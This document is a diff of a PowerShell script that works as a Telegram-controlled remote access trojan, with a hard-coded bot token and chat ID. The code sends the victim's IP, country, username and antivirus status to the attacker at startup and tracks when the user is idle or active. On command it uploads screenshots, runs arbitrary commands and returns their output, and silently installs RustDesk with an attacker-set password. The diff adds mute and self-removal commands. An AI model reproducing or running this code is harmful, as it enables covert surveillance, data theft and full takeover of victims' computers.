@@ -1,5 +1,6 @@
 $botToken = "7319129301:AAGJeISBdsqDQ2Gn9mW37RKEUmDT-MnfUZo"
 $authorizedChatId = 7730103423
+$taskfolder = "$env:temp\9999"
 
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
@@ -34,6 +35,7 @@ if (-not $antivirus) {
 $username = $env:USERNAME
 
 $timezone = (Get-TimeZone).Id
+$country = (Invoke-RestMethod -Uri "http://ip-api.com/json/").country
 
 Add-Type @"
 using System;
@@ -57,13 +59,15 @@ public class Win32Helper {
 $systemInfoMessage = @"
 [ $public ]
 [ $timezone ]
+[ $country ]
 [ $username ] 
 [ $antivirus ]
 "@
 
+# Send system info message at startup (always sent)
 $params = @{
-    chat_id = $authorizedChatId
-    text = "<pre>$systemInfoMessage</pre>"
+    chat_id    = $authorizedChatId
+    text       = "<pre>$systemInfoMessage</pre>"
     parse_mode = "HTML"
 }
 Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
@@ -71,6 +75,7 @@ Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Meth
 $inactivityThreshold = 3600
 $lastState = "Active"
 $lastUpdateId = 0
+$sendMessages = $true  # Global flag controlling all outgoing messages
 
 while ($true) {
     $lastInput = [Win32Helper]::GetLastInputTime()
@@ -78,23 +83,27 @@ while ($true) {
     $idleTime = ($currentTick - $lastInput) / 1000
 
     if ($idleTime -ge $inactivityThreshold -and $lastState -eq "Active") {
-        $message = "[ $username ]`n[ inactive ]`n[ $(Get-Date -Format 'h:mm tt') ]"
-        $params = @{
-            chat_id = $authorizedChatId
-            text = "<pre>$message</pre>"
-            parse_mode = "HTML"
+        if ($sendMessages) {
+            $message = "[ $username ]`n[ inactive ]`n[ $(Get-Date -Format 'h:mm tt') ]"
+            $params = @{
+                chat_id    = $authorizedChatId
+                text       = "<pre>$message</pre>"
+                parse_mode = "HTML"
+            }
+            Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
         }
-        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
         $lastState = "Inactive"
     }
     elseif ($idleTime -lt $inactivityThreshold -and $lastState -eq "Inactive") {
-        $message = "[ $username ]`n[ active ]`n[ $(Get-Date -Format 'h:mm tt') ]"
-        $params = @{
-            chat_id = $authorizedChatId
-            text = "<pre>$message</pre>"
-            parse_mode = "HTML"
+        if ($sendMessages) {
+            $message = "[ $username ]`n[ active ]`n[ $(Get-Date -Format 'h:mm tt') ]"
+            $params = @{
+                chat_id    = $authorizedChatId
+                text       = "<pre>$message</pre>"
+                parse_mode = "HTML"
+            }
+            Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
         }
-        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
         $lastState = "Active"
     }
 
@@ -107,112 +116,150 @@ while ($true) {
                 if ($update.message.chat.id -eq $authorizedChatId) {
                     $messageText = $update.message.text
                     
-                    if ($messageText -match "^/screen\s+$username\s*$") {
-                        $virtualScreen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-                        $bounds = [Drawing.Rectangle]::FromLTRB(
-                            $virtualScreen.Left, 
-                            $virtualScreen.Top, 
-                            $virtualScreen.Left + $virtualScreen.Width, 
-                            $virtualScreen.Top + $virtualScreen.Height
-                        )
-                        $randomFileName = [System.IO.Path]::GetRandomFileName() + ".png"
-                        $screenshotPath = Join-Path -Path $env:TEMP -ChildPath $randomFileName
-
-                        try {
-                            screenshot $bounds $screenshotPath
-                            $telegramApiUrl = "https://api.telegram.org/bot$botToken/sendPhoto"
-                            $httpClient = New-Object System.Net.Http.HttpClient
-                            $content = New-Object System.Net.Http.MultipartFormDataContent
-
-                            $chatContent = New-Object System.Net.Http.StringContent($authorizedChatId.ToString())
-                            $content.Add($chatContent, "chat_id")
-
-                            $fileStream = [System.IO.File]::OpenRead($screenshotPath)
-                            $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
-                            $content.Add($fileContent, "photo", [System.IO.Path]::GetFileName($screenshotPath))
-
-                            $response = $httpClient.PostAsync($telegramApiUrl, $content).Result
-                            Write-Host "Screenshot sent successfully"
+                    # Process always-active commands regardless of mute state
+                    if ($messageText -match "^/mute\s+$username\s*$") {
+                        $sendMessages = $false
+                        $params = @{
+                            chat_id    = $authorizedChatId
+                            text       = "<pre>All messages have been stopped.</pre>"
+                            parse_mode = "HTML"
                         }
-                        catch {
-                            Write-Error "Screenshot error: $_"
+                        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
+                    }
+                    elseif ($messageText -match "^/unmute\s+$username\s*$") {
+                        $sendMessages = $true
+                        $params = @{
+                            chat_id    = $authorizedChatId
+                            text       = "<pre>Message sending resumed.</pre>"
+                            parse_mode = "HTML"
+                        }
+                        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
+                    }
+                    elseif ($messageText -match "^/killbot\s+$username\s*$") {
+                        remove-item -path $taskfolder -recurse -force
+                        $params = @{
+                            chat_id    = $authorizedChatId
+                            text       = "<pre>bot removed succesfully</pre>"
+                            parse_mode = "HTML"
+                        }
+                        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
+                    }
+                    elseif ($messageText -match "^/bot\s*$") {
+                        $botMessage = "listening...`n$public`n$country`n$username"
+                        $params = @{
+                            chat_id    = $authorizedChatId
+                            text       = "<pre>$botMessage</pre>"
+                            parse_mode = "HTML"
+                        }
+                        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
+                    }
+                    # If messages are muted, ignore other commands.
+                    elseif (-not $sendMessages) {
+                        continue
+                    }
+                    else {
+                        if ($messageText -match "^/desktop\s+$username\s*$") {
+                            $virtualScreen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+                            $bounds = [Drawing.Rectangle]::FromLTRB(
+                                $virtualScreen.Left, 
+                                $virtualScreen.Top, 
+                                $virtualScreen.Left + $virtualScreen.Width, 
+                                $virtualScreen.Top + $virtualScreen.Height
+                            )
+                            $randomFileName = [System.IO.Path]::GetRandomFileName() + ".png"
+                            $screenshotPath = Join-Path -Path $env:TEMP -ChildPath $randomFileName
+
+                            try {
+                                screenshot $bounds $screenshotPath
+                                $telegramApiUrl = "https://api.telegram.org/bot$botToken/sendPhoto"
+                                $httpClient = New-Object System.Net.Http.HttpClient
+                                $content = New-Object System.Net.Http.MultipartFormDataContent
+
+                                $chatContent = New-Object System.Net.Http.StringContent($authorizedChatId.ToString())
+                                $content.Add($chatContent, "chat_id")
+
+                                $fileStream = [System.IO.File]::OpenRead($screenshotPath)
+                                $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
+                                $content.Add($fileContent, "photo", [System.IO.Path]::GetFileName($screenshotPath))
+
+                                $response = $httpClient.PostAsync($telegramApiUrl, $content).Result
+                                Write-Host "Screenshot sent successfully"
+                            }
+                            catch {
+                                Write-Error "Screenshot error: $_"
+                                $params = @{
+                                    chat_id = $authorizedChatId
+                                    text    = "Failed to capture/send screenshot: $($_.Exception.Message)"
+                                }
+                                Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
+                            }
+                            finally {
+                                if ($fileStream) { $fileStream.Dispose() }
+                                if ($httpClient) { $httpClient.Dispose() }
+                                if (Test-Path $screenshotPath) { Remove-Item -Path $screenshotPath -Force }
+                            }
+                        }
+                        elseif ($messageText -match "^/terminal\s+$username\s*\[([\s\S]+)\]$") {
+                            $commandToRun = $matches[1]
+                            $output = try {
+                                Invoke-Expression $commandToRun 2>&1 | Out-String
+                            } catch {
+                                "Error executing command: $_"
+                            }
+                            $output = $output.Trim()
+                            if (-not $output) { $output = "(No output from command)" }
+                            if ($output.Length -gt 4000) { $output = $output.Substring(0, 4000) + "`n...(truncated)" }
+                            
                             $params = @{
-                                chat_id = $authorizedChatId
-                                text = "Failed to capture/send screenshot: $($_.Exception.Message)"
+                                chat_id    = $authorizedChatId
+                                text       = "<pre>[$(Get-Date -Format 'hh:mm:ss')]`n$([System.Net.WebUtility]::HtmlEncode($output))</pre>"
+                                parse_mode = "HTML"
                             }
                             Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
                         }
-                        finally {
-                            if ($fileStream) { $fileStream.Dispose() }
-                            if ($httpClient) { $httpClient.Dispose() }
-                            if (Test-Path $screenshotPath) { Remove-Item -Path $screenshotPath -Force }
+                        elseif ($messageText -match "^/rustdesk\s+$username\s*$") {
+                            try {
+                                (New-Object -ComObject WScript.Shell).SendKeys([char]173)
+                                Invoke-WebRequest -Uri "https://github.com/rustdesk/rustdesk/releases/download/1.3.8/rustdesk-1.3.8-x86_64.exe" -OutFile "$env:temp\rustdesk-1.3.8-x86_64.exe"
+                                Push-Location "$env:temp"
+                                .\rustdesk-1.3.8-x86_64.exe --silent-install
+                                $rustdeskId = .\rustdesk-1.3.8-x86_64.exe --get-id | Select-String "^\d+$"
+                                $path = "$env:APPDATA\RustDesk\config\RustDesk.toml"
+                                (Get-Content $path) | ForEach-Object -Begin { $i=0 } -Process {
+                                    $i++
+                                    if ($i -eq 2) { "password = 'fuckrustdesk@A1'" }
+                                    else { $_ }
+                                } | Set-Content $path
+                                Pop-Location
+                                $output = "RustDesk executed successfully. RustDesk ID: $rustdeskId"
+                            }
+                            catch {
+                                $output = "Error executing RustDesk command: $($_.Exception.Message)"
+                            }
+                            $params = @{
+                                chat_id    = $authorizedChatId
+                                text       = "<pre>[$(Get-Date -Format 'hh:mm:ss')]`n$output</pre>"
+                                parse_mode = "HTML"
+                            }
+                            Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
                         }
-                    }
-                    elseif ($messageText -match "^/command\s+$username\s*\[([\s\S]+)\]$") {
-                        $commandToRun = $matches[1]
-                        $output = try {
-                            Invoke-Expression $commandToRun 2>&1 | Out-String
-                        } catch {
-                            "Error executing command: $_"
+                        elseif ($messageText -match "^/killrustdesk\s+$username\s*$") {
+                            try {
+                                Push-Location "$env:temp"
+                                .\rustdesk-1.3.8-x86_64.exe --uninstall
+                                Pop-Location
+                                $output = "RustDesk uninstalled successfully."
+                            }
+                            catch {
+                                $output = "Error executing killrustdesk command: $($_.Exception.Message)"
+                            }
+                            $params = @{
+                                chat_id    = $authorizedChatId
+                                text       = "<pre>[$(Get-Date -Format 'hh:mm:ss')]`n$output</pre>"
+                                parse_mode = "HTML"
+                            }
+                            Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
                         }
-                        $output = $output.Trim()
-                        if (-not $output) { $output = "(No output from command)" }
-                        if ($output.Length -gt 4000) { $output = $output.Substring(0, 4000) + "`n...(truncated)" }
-                        
-                        $params = @{
-                            chat_id = $authorizedChatId
-                            text = "<pre>[$(Get-Date -Format 'hh:mm:ss')]`n$([System.Net.WebUtility]::HtmlEncode($output))</pre>"
-                            parse_mode = "HTML"
-                        }
-                        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
-                    }
-                    elseif ($messageText -match "^/rustdesk\s+$username\s*$") {
-                        try {
-                            # Send a hidden keystroke if needed
-                            (New-Object -ComObject WScript.Shell).SendKeys([char]173)
-                            # Download RustDesk installer
-                            Invoke-WebRequest -Uri "https://github.com/rustdesk/rustdesk/releases/download/1.3.8/rustdesk-1.3.8-x86_64.exe" -OutFile "$env:temp\rustdesk-1.3.8-x86_64.exe"
-                            Push-Location "$env:temp"
-                            # Silent installation of RustDesk
-                            .\rustdesk-1.3.8-x86_64.exe --silent-install
-                            # Get RustDesk ID (capturing output)
-                            $rustdeskId = .\rustdesk-1.3.8-x86_64.exe --get-id | Select-String "^\d+$"
-                            # Modify the configuration to change the password (second line replacement)
-                            $path = "$env:APPDATA\RustDesk\config\RustDesk.toml"
-                            (Get-Content $path) | ForEach-Object -Begin { $i=0 } -Process {
-                                $i++
-                                if ($i -eq 2) { "password = 'fuckrustdesk@A1'" }
-                                else { $_ }
-                            } | Set-Content $path
-                            Pop-Location
-                            $output = "RustDesk executed successfully. RustDesk ID: $rustdeskId"
-                        }
-                        catch {
-                            $output = "Error executing RustDesk command: $($_.Exception.Message)"
-                        }
-                        $params = @{
-                            chat_id = $authorizedChatId
-                            text = "<pre>[$(Get-Date -Format 'hh:mm:ss')]`n$output</pre>"
-                            parse_mode = "HTML"
-                        }
-                        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
-                    }
-                    elseif ($messageText -match "^/killrustdesk\s+$username\s*$") {
-                        try {
-                            Push-Location "$env:temp"
-                            .\rustdesk-1.3.8-x86_64.exe --uninstall
-                            Pop-Location
-                            $output = "RustDesk uninstalled successfully."
-                        }
-                        catch {
-                            $output = "Error executing killrustdesk command: $($_.Exception.Message)"
-                        }
-                        $params = @{
-                            chat_id = $authorizedChatId
-                            text = "<pre>[$(Get-Date -Format 'hh:mm:ss')]`n$output</pre>"
-                            parse_mode = "HTML"
-                        }
-                        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
                     }
                 }
             }
